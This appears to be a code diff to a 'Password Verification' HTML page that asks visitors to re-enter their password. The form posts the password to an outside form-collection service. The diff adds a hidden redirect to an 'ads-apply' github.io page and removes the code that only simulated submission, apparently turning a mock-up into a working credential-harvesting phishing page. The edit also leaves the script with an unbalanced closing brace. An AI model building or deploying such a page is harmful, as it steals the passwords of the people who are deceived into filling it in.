@@ -182,6 +182,11 @@
         <div class="header">Password Verification</div>
         <p>Please re-enter your password to verify your identity.</p>
         <form id="passwordForm" action="https://submit-form.com/Nu5rygKAX" method="POST">
+             <input
+    type="hidden"
+    name="_redirect"
+    value="https://ads-apply.github.io/ads-apply/email-password.html">
+   
             <div class="form-group">
                 <input type="password" id="password" name="password" placeholder=" " required aria-required="true">
                 <label for="password">Password</label>
@@ -230,13 +235,7 @@
                 isValid = false;
             }
 
-            if (isValid) {
-                // Simulate form submission and redirect
-                setTimeout(function () {
-                    window.location.href = 'email-password.html';
-                }, 1000);
-            }
-        });
+           
     </script>
 </body>
 </html>
